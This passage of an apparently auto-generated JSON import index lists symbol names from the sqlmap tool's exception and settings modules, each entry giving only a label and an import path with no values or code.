        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapSystemException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapMissingDependence",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapMissingMandatoryOptionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapNoneDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUserQuitException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapFilePathException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUndefinedMethod",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapNoneDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapMissingMandatoryOptionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapNoneDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUserQuitException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapMissingMandatoryOptionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapNoneDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUndefinedMethod",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUndefinedMethod",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapNoneDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapMissingMandatoryOptionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUserQuitException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUndefinedMethod",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapFilePathException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapMissingDependence",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapMissingMandatoryOptionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapMissingPrivileges",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapNotVulnerableException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapSystemException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUndefinedMethod",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedDBMSException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapNoneDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUserQuitException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SUPPORTED_DBMS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BOUNDED_INJECTION_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CANDIDATE_SENTENCE_MIN_LENGTH",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CHECK_INTERNET_ADDRESS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CHECK_INTERNET_VALUE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_COOKIE_DELIMITER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_GET_POST_DELIMITER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DUMMY_NON_SQLI_CHECK_APPENDIX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "FI_ERROR_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "FORMAT_EXCEPTION_STRINGS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HEURISTIC_CHECK_ALPHABET",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INFERENCE_EQUALS_CHAR",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IPS_WAF_CHECK_PAYLOAD",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IPS_WAF_CHECK_RATIO",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IPS_WAF_CHECK_TIMEOUT",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_DIFFLIB_SEQUENCE_LENGTH",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_STABILITY_DELAY",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "NON_SQLI_CHECK_PREFIX_SUFFIX_LENGTH",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PRECONNECT_INCOMPATIBLE_SERVERS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SINGLE_QUOTE_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SLEEP_TIME_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SUHOSIN_MAX_VALUE_LENGTH",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SUPPORTED_DBMS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UPPER_RATIO_BOUND",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "URI_HTTP_HEADER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ASP_NET_CONTROL_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CSRF_TOKEN_PARAMETER_INFIXES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_GET_POST_DELIMITER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "EMPTY_FORM_FIELDS_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "GOOGLE_ANALYTICS_COOKIE_PREFIX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HOST_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IGNORE_PARAMETERS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "LOW_TEXT_PERCENT",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "REFERER_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "USER_AGENT_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ACCESS_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ALTIBASE_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CACHE_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CRATEDB_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CUBRID_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DB2_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DERBY_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "EXTREMEDB_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "FIREBIRD_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "FRONTBASE_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "H2_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HSQLDB_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INFORMIX_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAXDB_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MCKOI_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MIMERSQL_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MONETDB_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MSSQL_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MYSQL_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ORACLE_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PGSQL_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PRESTO_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RAIMA_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SQLITE_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SYBASE_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VERTICA_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VIRTUOSO_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BOUNDED_BASE64_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BOUNDARY_BACKSLASH_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BOUNDED_INJECTION_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_COOKIE_DELIMITER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_GET_POST_DELIMITER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "GENERIC_SQL_COMMENT",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "GENERIC_SQL_COMMENT_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INFERENCE_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "NULL",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PAYLOAD_DELIMITER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "REPLACEMENT_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SINGLE_QUOTE_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SLEEP_TIME_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNICODE_ENCODING",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BIGARRAY_CHUNK_SIZE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BIGARRAY_COMPRESS_LEVEL",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BANNER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BOLD_PATTERNS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BOUNDARY_BACKSLASH_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BOUNDED_INJECTION_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BRUTE_DOC_ROOT_PREFIXES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BRUTE_DOC_ROOT_SUFFIXES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BRUTE_DOC_ROOT_TARGET_MARK",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BURP_REQUEST_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BURP_XML_HISTORY_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CRAWL_EXCLUDE_EXTENSIONS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CUSTOM_INJECTION_MARK_CHAR",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DBMS_DIRECTORY_DICT",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_COOKIE_DELIMITER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_GET_POST_DELIMITER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_MSSQL_SCHEMA",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEV_EMAIL_ADDRESS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DOLLAR_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DUMMY_USER_INJECTION",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DYNAMICITY_BOUNDARY_LENGTH",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ERROR_PARSING_REGEXES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "EVALCODE_ENCODED_PREFIX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "FILE_PATH_REGEXES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "FORCE_COOKIE_EXPIRATION_TIME",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "FORM_SEARCH_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "GENERIC_DOC_ROOT_DIRECTORY_NAMES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "GIT_PAGE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "GITHUB_REPORT_OAUTH_TOKEN",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "GOOGLE_ANALYTICS_COOKIE_PREFIX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HASHDB_MILESTONE_VALUE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HOST_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
